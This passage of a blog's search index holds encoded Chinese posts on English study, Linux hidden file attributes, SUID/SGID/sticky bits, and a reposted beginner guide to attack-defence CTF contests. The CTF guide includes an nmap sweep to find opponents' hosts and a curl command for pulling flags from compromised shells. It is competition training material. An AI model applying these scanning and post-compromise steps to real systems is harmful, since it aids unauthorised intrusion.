&#xFF08;&#x597D;&#x8BFB;&#x3001;&#x6709;&#x8DA3;&#x3001;&#x4E66;&#x4E0D;&#x539A;&#x6211;&#x7684;&#x9605;&#x8BFB;&#x65B9;&#x6CD5;&#x662F;&#xFF0C;&#x4E00;&#x6B21;&#x8BFB;&#x4E00;&#x7AE0;&#x8282;&#xFF0C;&#x4E0D;&#x61C2;&#x7684;&#x5355;&#x8BCD;&#x67E5;&#x5B57;&#x5178;&#x5E76;&#x6807;&#x8BB0;&#xFF08;Kindle&#x4E0A;&#x6BD4;&#x8F83;&#x65B9;&#x4FBF;&#xFF09;&#xFF1B;&#x8BFB;&#x5B8C;&#x672C;&#x7AE0;&#x8282;&#x540E;&#x56DE;&#x987E;&#x6807;&#x8BB0;&#x7684;&#x5355;&#x8BCD;&#xFF1B;&#x7B2C;&#x4E8C;&#x5929;&#x5148;&#x56DE;&#x987E;&#x6628;&#x65E5;&#x6807;&#x8BB0;&#x5355;&#x8BCD;&#xFF0C;&#x518D;&#x590D;&#x770B;&#x6628;&#x65E5;&#x7AE0;&#x8282;&#xFF1B;&#x7136;&#x540E;&#x7EE7;&#x7EED;&#x9605;&#x8BFB;&#x4E0B;&#x4E00;&#x7AE0;&#x8282;&#xFF1B;&#x5982;&#x6B64;&#x65B9;&#x5F0F;&#x6301;&#x7EED;&#x8BFB;&#x5B8C;&#x3002; &#x89C6;&#x542C;TED http://www.ted.com/talks &#xFF08;&#x4E30;&#x5BCC;&#x4F18;&#x8D28;&#x7684;&#x6F14;&#x8BB2;&#x89C6;&#x9891;&#xFF0C;&#x6709;&#x591A;&#x56FD;&#x8BED;&#x8A00;&#x5B57;&#x5E55; &#x53F2;&#x8482;&#x592B;&#xB7;&#x4E54;&#x5E03;&#x65AF;2005&#x5E74;6&#x6708;&#x5728;&#x65AF;&#x5766;&#x798F;&#x5927;&#x5B66;&#x6BD5;&#x4E1A;&#x5178;&#x793C;&#x4E0A;&#x7684;&#x6F14;&#x8BB2;&#x8BCD;&#x4E32;&#x4E0B;&#x8F7D; / &#x6F14;&#x8BB2;&#x6587;&#x672C;(&#x82F1;&#x6587;+&#x4E2D;&#x6587;)&#x4E0B;&#x8F7D; / &#x6F14;&#x8BB2;&#x89C6;&#x9891;(&#x4E2D;&#x82F1;&#x5B57;&#x5E55;) / &#x6F14;&#x8BB2;&#x97F3;&#x9891; Joe Wang&#x2019;s Talk Show on the Late Show&#x8BCD;&#x4E32;&#x4E0B;&#x8F7D; / &#x8131;&#x53E3;&#x79C0;&#x89C6;&#x9891; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[{"name":"英语","slug":"英语","permalink":"https://marnm.github.io/tags/英语/"},{"name":"学习","slug":"学习","permalink":"https://marnm.github.io/tags/学习/"}]},{"title":"Linux文件的隐藏属性","date":"2018-08-20T08:46:44.000Z","path":"/posts/cc999d74/","text":"&#x524D;&#x8A00;&#xA0;&#xA0;Linux&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x6587;&#x4EF6;&#x9664;&#x4E86;&#x5177;&#x5907;&#x4E00;&#x822C;&#x6743;&#x9650;&#x548C;&#x7279;&#x6B8A;&#x6743;&#x9650;&#x4E4B;&#x5916;&#xFF0C;&#x8FD8;&#x6709;&#x4E00;&#x79CD;&#x9690;&#x85CF;&#x6743;&#x9650;&#xFF0C;&#x5373;&#x88AB;&#x9690;&#x85CF;&#x8D77;&#x6765;&#x7684;&#x6743;&#x9650;&#xFF0C;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#x4E0D;&#x80FD;&#x76F4;&#x63A5;&#x88AB;&#x7528;&#x6237;&#x53D1;&#x89C9;&#x3002;&#x6709;&#x7528;&#x6237;&#x66FE;&#x7ECF;&#x5728;&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x548C;RHCE&#x8003;&#x8BD5;&#x9898;&#x76EE;&#x4E2D;&#x78B0;&#x5230;&#x8FC7;&#x660E;&#x660E;&#x6743;&#x9650;&#x5145;&#x8DB3;&#x4F46;&#x5374;&#x65E0;&#x6CD5;&#x5220;&#x9664;&#x67D0;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x6216;&#x8005;&#x4EC5;&#x80FD;&#x5728;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x4E2D;&#x8FFD;&#x52A0;&#x5185;&#x5BB9;&#x800C;&#x4E0D;&#x80FD;&#x4FEE;&#x6539;&#x6216;&#x5220;&#x9664;&#x5185;&#x5BB9;&#xFF0C;&#x8FD9;&#x5728;&#x4E00;&#x5B9A;&#x7A0B;&#x5EA6;&#x4E0A;&#x963B;&#x6B62;&#x4E86;&#x9ED1;&#x5BA2;&#x7BE1;&#x6539;&#x7CFB;&#x7EDF;&#x65E5;&#x5FD7;&#x7684;&#x56FE;&#x8C0B;&#xFF0C;&#x56E0;&#x6B64;&#x8FD9;&#x79CD;&#x201C;&#x5947;&#x602A;&#x201D;&#x7684;&#x6587;&#x4EF6;&#x4E5F;&#x4FDD;&#x969C;&#x4E86;Linux&#x7CFB;&#x7EDF;&#x7684;&#x5B89;&#x5168;&#x6027;&#x3002; chattr &#x547D;&#x4EE4;&#xA0;&#xA0;&#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x8BBE;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x9690;&#x85CF;&#x6743;&#x9650;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;chattr [&#x53C2;&#x6570;] &#x6587;&#x4EF6;&#x201D;&#x3002;&#x5982;&#x679C;&#x60F3;&#x8981;&#x628A;&#x67D0;&#x4E2A;&#x9690;&#x85CF;&#x529F;&#x80FD;&#x6DFB;&#x52A0;&#x5230;&#x6587;&#x4EF6;&#x4E0A;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x5728;&#x547D;&#x4EE4;&#x540E;&#x9762;&#x8FFD;&#x52A0;&#x201D;+&#x53C2;&#x6570;&#x201D;,&#x5982;&#x679C;&#x60F3;&#x8981;&#x628A;&#x67D0;&#x4E2A;&#x9690;&#x85CF;&#x529F;&#x80FD;&#x79FB;&#x51FA;&#x6587;&#x4EF6;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x8FFD;&#x52A0;&#x201D;-&#x53C2;&#x6570;&#x201D;&#x3002; &#x53C2;&#x6570; &#x4F5C;&#x7528; &#x53C2;&#x6570; &#x4F5C;&#x7528; i &#x65E0;&#x6CD5;&#x5BF9;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x4FEE;&#x6539;&#xFF1B;&#x82E5;&#x5BF9;&#x76EE;&#x5F55;&#x8BBE;&#x7F6E;&#x4E86;&#x8BE5;&#x53C2;&#x6570;&#xFF0C;&#x5219;&#x4EC5;&#x80FD;&#x5C31;&#x4FEE;&#x6539;&#x5176;&#x4E2D;&#x7684;&#x5B50;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#xFF0C;&#x800C;&#x4E0D;&#x80FD;&#x65B0;&#x5EFA;&#x6216;&#x5220;&#x9664;&#x6587;&#x4EF6; a &#x4EC5;&#x5141;&#x8BB8;&#x8865;&#x5145;&#xFF08;&#x8FFD;&#x52A0;&#xFF09;&#x5185;&#x5BB9;&#xFF0C;&#x65E0;&#x6CD5;&#x8986;&#x76D6;/&#x5220;&#x9664;&#x5185;&#x5BB9;(Append Only) S &#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x5728;&#x53D8;&#x66F4;&#x540E;&#x7ACB;&#x5373;&#x540C;&#x6B65;&#x5230;&#x786C;&#x76D8;(sync) s &#x5F7B;&#x5E95;&#x4ECE;&#x786C;&#x76D8;&#x4E2D;&#x5220;&#x9664;&#xFF0C;&#x4E0D;&#x53EF;&#x6062;&#x590D;&#xFF08;&#x7528;0&#x586B;&#x5145;&#x539F;&#x6587;&#x4EF6;&#x6240;&#x5728;&#x786C;&#x76D8;&#x533A;&#x57DF; A &#x4E0D;&#x518D;&#x4FEE;&#x6539;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;&#x7684;&#x6700;&#x540E;&#x8BBF;&#x95EE;&#x65F6;&#x95F4;(atime) b &#x4E0D;&#x518D;&#x4FEE;&#x6539;&#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;&#x7684;&#x5B58;&#x53D6;&#x65F6;&#x95F4; D &#x68C0;&#x67E5;&#x538B;&#x7F29;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x9519;&#x8BEF; d &#x4F7F;&#x7528;dump&#x547D;&#x4EE4;&#x5907;&#x4EFD;&#x662F;&#x5FFD;&#x7565;&#x672C;&#x6587;&#x4EF6;/&#x76EE;&#x5F55; c &#x9ED8;&#x8BA4;&#x5C06;&#x6587;&#x4EF6;&#x6216;&#x76EE;&#x5F55;&#x8FDB;&#x884C;&#x538B;&#x7F29; u &#x5F53;&#x5220;&#x9664;&#x8BE5;&#x6587;&#x4EF6;&#x540E;&#x4F9D;&#x7136;&#x4FDD;&#x7559;&#x5176;&#x5728;&#x786C;&#x76D8;&#x4E2D;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x65B9;&#x4FBF;&#x65E5;&#x540E;&#x6062;&#x590D; t &#x8BA9;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x652F;&#x6301;&#x5C3E;&#x90E8;&#x5408;&#x5E76;(tail-merging) x &#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8BBF;&#x95EE;&#x538B;&#x7F29;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x5185;&#x5BB9; lsattr &#x547D;&#x4EE4;&#xA0;&#xA0;lsattr&#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x663E;&#x793A;&#x6587;&#x4EF6;&#x7684;&#x9690;&#x85CF;&#x6743;&#x9650;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;lsattr [&#x53C2;&#x6570;] &#x6587;&#x4EF6;&#x3002;&#x5728;Linux&#x7CFB;&#x7EDF;&#x4E2D;&#x4E2A;&#xFF0C;&#x6587;&#x4EF6;&#x7684;&#x9690;&#x85CF;&#x6743;&#x9650;&#x5FC5;&#x987B;&#x4F7F;&#x7528;lsattr&#x547D;&#x4EE4;&#x67E5;&#x770B;&#xFF0C;&#x5E73;&#x65F6;&#x4F7F;&#x7528;ls&#x4E4B;&#x7C7B;&#x7684;&#x547D;&#x4EE4;&#x5219;&#x770B;&#x4E0D;&#x51FA;&#x6765;&#x3002; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[{"name":"Linux","slug":"Linux","permalink":"https://marnm.github.io/tags/Linux/"},{"name":"chattr命令","slug":"chattr命令","permalink":"https://marnm.github.io/tags/chattr命令/"},{"name":"lsattr命令","slug":"lsattr命令","permalink":"https://marnm.github.io/tags/lsattr命令/"}]},{"title":"Linux文件的特殊权限","date":"2018-08-19T15:05:06.000Z","path":"/posts/a9bb0c1a/","text":"SUIDSUID&#x662F;&#x4E00;&#x79CD;&#x5BF9;&#x4E8C;&#x8FDB;&#x5236;&#x7A0B;&#x5E8F;&#x8FDB;&#x884C;&#x8BBE;&#x7F6E;&#x7684;&#x7279;&#x6B8A;&#x6743;&#x9650;&#xFF0C;&#x53EF;&#x4EE5;&#x8BA9;&#x4E8C;&#x8FDB;&#x5236;&#x7A0B;&#x5E8F;&#x7684;&#x6267;&#x884C;&#x8005;&#x4E34;&#x65F6;&#x62E5;&#x6709;&#x5C5E;&#x4E3B;&#x7684;&#x6743;&#x9650;&#xFF08;&#x4EC5;&#x5BF9;&#x62E5;&#x6709;&#x6267;&#x884C;&#x6743;&#x9650;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x7A0B;&#x5E8F;&#x6709;&#x6548;&#xFF09;&#x3002;&#x5C31;&#x60F3;&#x624B;&#x6301;&#x5C1A;&#x65B9;&#x5B9D;&#x5251;&#x7684;&#x94A6;&#x5DEE;&#x5927;&#x81E3;&#xFF0C;&#x4ED6;&#x624B;&#x6301;&#x7684;&#x5C1A;&#x65B9;&#x5B9D;&#x5251;&#x4EE3;&#x8868;&#x7684;&#x662F;&#x7687;&#x4E0A;&#x7684;&#x6743;&#x5A01;&#xFF0C;&#x56E0;&#x6B64;&#x53EF;&#x4EE5;&#x60E9;&#x6212;&#x8D2A;&#x5B98;&#xFF0C;&#x4F46;&#x5E76;&#x4E0D;&#x610F;&#x5473;&#x8FD9;&#x4ED6;&#x6C38;&#x4E45;&#x6210;&#x4E3A;&#x4E86;&#x7687;&#x4E0A;&#x3002;&#x67E5;&#x770B;passwd&#x547D;&#x4EE4;&#x5C5E;&#x6027;&#x662F;&#x53D1;&#x73B0;&#x6240;&#x6709;&#x8005;&#x7684;&#x6743;&#x9650;&#x6709;rwx&#x53D8;&#x6210;&#x4E86;rws&#xFF0C;&#x5176;&#x4E2D;x&#x53D8;&#x6210;s&#x5C31;&#x610F;&#x5473;&#x7740;&#x8BE5;&#x6587;&#x4EF6;&#x88AB;&#x8D4B;&#x4E88;&#x4E86;SUID&#x6743;&#x9650;&#x3002;&#x90A3;&#x5982;&#x679C;&#x539F;&#x672C;&#x7684;&#x6743;&#x9650;&#x662F;rw-&#x5462;?&#x5982;&#x679C;&#x539F;&#x5148;&#x7684;&#x6743;&#x9650;&#x4F4D;&#x4E0A;&#x6CA1;&#x6709;x&#x6267;&#x884C;&#x6743;&#x9650;&#xFF0C;&#x90A3;&#x4E48;&#x80CC;&#x8D4B;&#x4E88;&#x7279;&#x6B8A;&#x6743;&#x9650;&#x540E;&#x5C06;&#x53D8;&#x6210;&#x5927;&#x5199;&#x7684;S&#x3002; SGIDSGID&#x4E3B;&#x8981;&#x5B9E;&#x73B0;&#x5982;&#x4E0B;&#x4E24;&#x79CD;&#x529F;&#x80FD;&#xFF1A;&gt; &#x8BA9;&#x6267;&#x884C;&#x8005;&#x4E34;&#x65F6;&#x62E5;&#x6709;&#x5C5E;&#x7EC4;&#x7684;&#x6743;&#x9650;&#xFF08;&#x5BF9;&#x62E5;&#x6709;&#x6267;&#x884C;&#x6743;&#x9650;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x7A0B;&#x5E8F;&#x8FDB;&#x884C;&#x8BBE;&#x7F6E;&#xFF09;&#xFF1B;&gt; &#x5728;&#x67D0;&#x4E2A;&#x76EE;&#x5F55;&#x4E2D;&#x521B;&#x5EFA;&#x7684;&#x6587;&#x4EF6;&#x81EA;&#x52A8;&#x7EE7;&#x627F;&#x8BE5;&#x76EE;&#x5F55;&#x7684;&#x7528;&#x6237;&#x7EC4;&#xFF08;&#x53EA;&#x53EF;&#x4EE5;&#x5BF9;&#x76EE;&#x5F55;&#x8FDB;&#x884C;&#x8BBE;&#x7F6E;&#xFF09;&#x3002; SBIT&#x73B0;&#x5728;&#xFF0C;&#x5927;&#x5B66;&#x91CC;&#x7684;&#x5F88;&#x591A;&#x8001;&#x5E08;&#x90FD;&#x8981;&#x6C42;&#x5B66;&#x751F;&#x5C06;&#x4F5C;&#x4E1A;&#x4E0A;&#x4F20;&#x5230;&#x670D;&#x52A1;&#x5668;&#x7684;&#x7279;&#x5B9A;&#x5171;&#x4EAB;&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#x4F46;&#x603B;&#x662F;&#x6709;&#x51E0;&#x4E2A;&#x201C;&#x7834;&#x574F;&#x5206;&#x5B50;&#x201D;&#x559C;&#x6B22;&#x5220;&#x9664;&#x5176;&#x4ED6;&#x540C;&#x5B66;&#x7684;&#x4F5C;&#x4E1A;&#xFF0C;&#x8FD9;&#x65F6;&#x5C31;&#x8981;&#x8BBE;&#x7F6E;SBIT(Sticky Bit)&#x7279;&#x6B8A;&#x6743;&#x9650;&#x4F4D;&#x4E86;(&#x4E5F;&#x53EF;&#x4EE5;&#x79F0;&#x4E4B;&#x4E3A;&#x7279;&#x6B8A;&#x6743;&#x9650;&#x4F4D;&#x4E4B;&#x7C98;&#x6EDE;&#x4F4D;)&#x3002;SBIT&#x7279;&#x6B8A;&#x6743;&#x9650;&#x53EF;&#x786E;&#x4FDD;&#x7528;&#x6237;&#x53EA;&#x80FD;&#x5220;&#x9664;&#x81EA;&#x5DF1;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x800C;&#x4E0D;&#x80FD;&#x5220;&#x9664;&#x5176;&#x4ED6;&#x7528;&#x6237;&#x7684;&#x6587;&#x4EF6;&#x3002; &#x5F85;&#x66F4;&#x65B0;&#x3002;&#x3002;&#x3002; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[{"name":"Linux","slug":"Linux","permalink":"https://marnm.github.io/tags/Linux/"}]},{"title":"CTF线下赛AWD套路小结","date":"2018-08-13T09:03:28.000Z","path":"/posts/28c30eb2/","text":"CTF&#x7F51;&#x7EDC;&#x5B89;&#x5168;&#x653B;&#x9632;&#x8D5B;&#x5165;&#x95E8;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x5BF9;&#x9ED1;&#x5BA2;&#x653B;&#x9632;&#x611F;&#x5174;&#x8DA3;&#x7684;&#x8BDD;&#x770B;&#x770B;&#x8FD9;&#x7BC7;&#x5165;&#x95E8;&#x3002;&#x65B0;&#x624B;&#x8BE5;&#x77E5;&#x9053;&#x7684;&#x4E00;&#x4E9B;&#x77E5;&#x8BC6;&#x4EE5;&#x53CA;&#x6280;&#x5DE7;&#xFF0C;&#x4E0B;&#x9762;&#x7B80;&#x5355;&#x6574;&#x7406;&#x4E00;&#x4E0B; &#x539F;&#x521B;&#xFF1A;tinyfisher&#x8F6C;&#x8F7D;&#xFF1A;&#x5148;&#x77E5;&#x5B89;&#x5168;&#x6280;&#x672F;&#x793E;&#x533A; &#x6700;&#x8FD1;&#x6253;&#x4E86;2&#x573A;CTF&#x7EBF;&#x4E0B;&#x8D5B;&#xFF0C;&#x628A;AWD&#x6A21;&#x5F0F;&#x4E2D;&#x7684;&#x4E00;&#x4E9B;&#x5C0F;&#x5957;&#x8DEF;&#x505A;&#x4E00;&#x4E9B;&#x603B;&#x7ED3;&#xFF0C;&#x672C;&#x4EBA;web&#x72D7;&#xFF0C;&#x4E8C;&#x8FDB;&#x5236;&#x90E8;&#x5206;&#x5C31;&#x4E0D;&#x73ED;&#x95E8;&#x5F04;&#x65A7;&#x4E86;&#x3002; &#x4E00;&#x3001;AWD&#x6A21;&#x5F0F;&#x7B80;&#x4ECB;AWD: Attack With Defence, &#x6BD4;&#x8D5B;&#x4E2D;&#x6BCF;&#x4E2A;&#x961F;&#x4F0D;&#x7EF4;&#x62A4;&#x591A;&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#x4E2D;&#x5B58;&#x5728;&#x591A;&#x4E2A;&#x6F0F;&#x6D1E;&#xFF0C;&#x5229;&#x7528;&#x6F0F;&#x6D1E;&#x653B;&#x51FB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x5F97;&#x5206;&#xFF0C;&#x4FEE;&#x590D;&#x6F0F;&#x6D1E;&#x53EF;&#x4EE5;&#x907F;&#x514D;&#x88AB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x653B;&#x51FB;&#x5931;&#x5206;&#x3002; &#x4E00;&#x822C;&#x5206;&#x914D;Web&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x670D;&#x52A1;&#x5668;&#xFF08;&#x591A;&#x6570;&#x4E3A;Linux&#xFF09;&#x67D0;&#x5904;&#x5B58;&#x5728;flag&#xFF08;&#x4E00;&#x822C;&#x5728;&#x6839;&#x76EE;&#x5F55;&#x4E0B;&#xFF09;&#xFF1B; &#x53EF;&#x80FD;&#x4F1A;&#x63D0;&#x4F9B;&#x4E00;&#x53F0;&#x6D41;&#x91CF;&#x5206;&#x6790;&#x865A;&#x62DF;&#x673A;&#xFF0C;&#x53EF;&#x4EE5;&#x4E0B;&#x8F7D;&#x6D41;&#x91CF;&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x5206;&#x6790;&#xFF1B; flag&#x5728;&#x4E3B;&#x529E;&#x65B9;&#x7684;&#x8BBE;&#x5B9A;&#x4E0B;&#x6BCF;&#x9694;&#x4E00;&#x5B9A;&#x65F6;&#x95F4;&#x5237;&#x65B0;&#x4E00;&#x8F6E;&#xFF1B; &#x5404;&#x961F;&#x4E00;&#x822C;&#x90FD;&#x6709;&#x81EA;&#x5DF1;&#x7684;&#x521D;&#x59CB;&#x5206;&#x6570;&#xFF1B; flag&#x4E00;&#x65E6;&#x88AB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x62FF;&#x8D70;&#xFF0C;&#x8BE5;&#x961F;&#x6263;&#x9664;&#x4E00;&#x5B9A;&#x79EF;&#x5206;&#xFF1B; &#x6263;&#x9664;&#x7684;&#x79EF;&#x5206;&#x6709;&#x83B7;&#x53D6;flag&#x7684;&#x961F;&#x4F0D;&#x5747;&#x5206;&#xFF1B; &#x4E3B;&#x529E;&#x65B9;&#x4F1A;&#x5BF9;&#x6BCF;&#x4E2A;&#x961F;&#x4F0D;&#x7684;&#x670D;&#x52A1;&#x8FDB;&#x884C;check&#xFF0C;&#x670D;&#x52A1;&#x5B95;&#x673A;&#x6263;&#x9664;&#x672C;&#x8F6E;flag&#x5206;&#x6570;&#xFF0C;&#x6263;&#x9664;&#x7684;&#x5206;&#x503C;&#x7531;&#x670D;&#x52A1;check&#x6B63;&#x5E38;&#x7684;&#x961F;&#x4F0D;&#x5747;&#x5206;&#xFF1B; &#x4E00;&#x822C;&#x6BCF;&#x4E2A;&#x961F;&#x4F0D;&#x4F1A;&#x7ED9;&#x4E00;&#x4E2A;&#x4F4E;&#x6743;&#x9650;&#x7528;&#x6237;&#xFF0C;&#x975E;root&#x6743;&#x9650; &#x4E8C;&#x3001;&#x7F51;&#x7EDC;&#x73AF;&#x5883;&#x7F51;&#x7EDC;&#x62D3;&#x6251;&#x56FE;&#x5982;&#x4E0B;&#x56FE;&#x6240;&#x793A;&#xFF1A; &#x62D3;&#x6251;&#x56FE; &#x6BD4;&#x8D5B;&#x4E2D;&#x83B7;&#x53D6;flag&#x4E00;&#x822C;&#x6709;&#x4E24;&#x79CD;&#x6A21;&#x5F0F;&#xFF1A;&#xFF08;1&#xFF09;flag&#x5728;&#x6839;&#x76EE;&#x5F55;&#xFF0C;&#x8BFB;&#x53D6;flag&#x5185;&#x5BB9;&#xFF0C;&#x63D0;&#x4EA4;&#x5373;&#x53EF;&#x5F97;&#x5206;&#xFF08;2&#xFF09;&#x62FF;&#x5230;&#x5176;&#x4ED6;&#x961F;&#x4F0D;shell&#x540E;&#xFF0C;&#x6267;&#x884C;&#x6307;&#x5B9A;&#x547D;&#x4EE4;&#xFF08;curl 10.0.0.2&#xFF09;&#xFF0C;&#x5373;&#x53EF;&#x4ECE;&#x4E0A;&#x56FE;&#x4E2D;flag&#x673A;&#x83B7;&#x53D6;flag&#x5185;&#x5BB9;&#xFF1B; &#x6BD4;&#x8D5B;&#x53EF;&#x80FD;&#x4F1A;&#x544A;&#x8BC9;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x7684;IP&#xFF0C;&#x4E5F;&#x53EF;&#x80FD;&#x4E0D;&#x4F1A;&#x544A;&#x8BC9;&#x4F60;&#xFF0C;&#x4E00;&#x822C;&#x5728;&#x540C;&#x4E00;&#x4E2A;C&#x6BB5;&#x6216;&#x8005;B&#x6BB5;&#xFF0C;&#x56E0;&#x6B64;&#x9996;&#x5148;&#x5229;&#x7528;nmap&#x7B49;&#x626B;&#x63CF;&#x5DE5;&#x5177;&#x53D1;&#x73B0;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x7684;IP&#xFF1A;nmap -sn 192.168.71.0/24&#x6216;&#x8005;&#x5229;&#x7528;https://github.com/zer0h/httpscan &#x7684;&#x811A;&#x672C;&#x8FDB;&#x884C;&#x626B;&#x63CF; &#x4E09;&#x3001; &#x6BD4;&#x8D5B;&#x5206;&#x5DE5;&#x7EBF;&#x4E0B;&#x8D5B;&#x4E00;&#x822C;3&#x4EBA;&#x5DE6;&#x53F3;&#xFF0C;2&#x4EBA;&#x653B;&#x51FB;&#xFF0C;1&#x4EBA;&#x9632;&#x5FA1;&#xFF0C;&#x56E0;&#x4E3A;&#x53D1;&#x73B0;&#x7684;&#x6F0F;&#x6D1E;&#x53EF;&#x4EE5;&#x653B;&#x51FB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#xFF0C;&#x4E5F;&#x8981;&#x8FDB;&#x884C;&#x4FEE;&#x590D;&#xFF0C;&#x6240;&#x4EE5;&#x653B;&#x9632;&#x76F8;&#x8F85;&#x76F8;&#x6210;&#xFF0C;&#x4EE5;&#x653B;&#x4E3A;&#x5B88;&#x3002; &#x6BD4;&#x8D5B;&#x4E2D;&#x6BCF;&#x4E2A;&#x961F;&#x4F0D;&#x53EF;&#x80FD;&#x4F1A;&#x7EF4;&#x62A4;&#x591A;&#x4E2A;&#x9776;&#x673A;&#xFF0C;web&#x3001;&#x4E8C;&#x8FDB;&#x5236;&#x7B49;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x6CA1;&#x4EBA;&#x8D1F;&#x8D23;&#x4E00;&#x53F0;&#xFF0C;&#x5404;&#x81EA;&#x8D1F;&#x8D23;&#x653B;&#x51FB;&#x548C;&#x9632;&#x5FA1;&#x3002; &#x56DB;&#x3001; &#x4E00;&#x4E9B;&#x201C;&#x5957;&#x8DEF;&#x201D; &#x5907;&#x4EFD;&#xFF01;&#x5907;&#x4EFD;&#xFF01;&#x5907;&#x4EFD;&#xFF01;&#x91CD;&#x8981;&#x7684;&#x4E8B;&#x60C5;&#x8BF4;&#x4E09;&#x904D;&#xFF0C;&#x6BD4;&#x8D5B;&#x5F00;&#x59CB;&#x540E;&#x7B2C;&#x4E00;&#x65F6;&#x95F4;&#x5907;&#x4EFD;&#x670D;&#x52A1;&#x5668;&#x4E2D;web&#x76EE;&#x5F55;&#x4E0B;&#x7684;&#x6587;&#x4EF6;&#xFF08;/var/www/html)&#xFF0C;&#x8FD9;&#x662F;&#x6211;&#x81EA;&#x6211;&#x5BA1;&#x8BA1;&#x7684;&#x57FA;&#x7840;&#xFF0C;&#x4E5F;&#x662F;&#x9632;&#x6B62;&#x670D;&#x52A1;&#x5668;&#x5728;&#x6BD4;&#x8D5B;&#x4E2D;&#x51FA;&#x73B0;&#x5F02;&#x5E38;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x53EF;&#x4EE5;&#x7ACB;&#x5373;&#x6062;&#x590D;&#x5230;&#x521D;&#x59CB;&#x72B6;&#x6001;&#x7684;&#x5148;&#x51B3;&#x6761;&#x4EF6;&#x3002;&#x6709;&#x7684;&#x6BD4;&#x8D5B;&#x53EF;&#x4EE5;&#x63D0;&#x4F9B;3&#x6B21;&#x5DE6;&#x53F3;&#x7684;&#x6062;&#x590D;&#x521D;&#x59CB;&#x8BBE;&#x7F6E;&#x7684;&#x673A;&#x4F1A;&#xFF0C;&#x6709;&#x7684;&#x6BD4;&#x8D5B;&#x4E0D;&#x63D0;&#x4F9B;&#xFF0C;&#x6240;&#x4EE5;&#x5907;&#x4EFD;&#x5341;&#x5206;&#x91CD;&#x8981;&#x3002; &#x53EF;&#x4EE5;&#x7528;scp&#x547D;&#x4EE4;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x4E00;&#x4E9B;&#x56FE;&#x5F62;&#x5316;&#x7684;&#x5DE5;&#x5177;&#xFF1A;Winscp&#x3001;FileZilla&#xFF0C;&#x64CD;&#x4F5C;&#x8D77;&#x6765;&#x6BD4;&#x4EF7;&#x65B9;&#x4FBF;&#x3002; winscp &#x53E3;&#x4EE4;&#x95EE;&#x9898;&#x5F31;&#x53E3;&#x4EE4;&#x7684;&#x95EE;&#x9898;&#x51E0;&#x4E4E;&#x662F;&#x5FC5;&#x8003;&#xFF0C;&#x6BD4;&#x8D5B;&#x5F00;&#x59CB;&#x540E;&#xFF0C;&#x5982;&#x679C;&#x53D1;&#x73B0;&#x6BCF;&#x4E2A;&#x961F;&#x4F0D;&#x7684;SSH&#x8D26;&#x53F7;&#x5BC6;&#x7801;&#x90FD;&#x662F;&#x4E00;&#x6837;&#x7684;&#xFF08;&#x67D0;&#x6B21;&#x6BD4;&#x8D5B;&#x4E2D;&#x90FD;&#x662F;phpCMS&#x3001;WordPress&#xFF09;&#xFF0C;&#x9700;&#x8981;&#x7ACB;&#x5373;&#x4FEE;&#x6539;&#x53E3;&#x4EE4;&#xFF0C;&#x5982;&#x679C;&#x88AB;&#x5176;&#x4ED6;&#x961F;&#x4F0D;&#x6539;&#x4E86;&#x90A3;&#x5C31;gg&#x4E86;&#x3002; 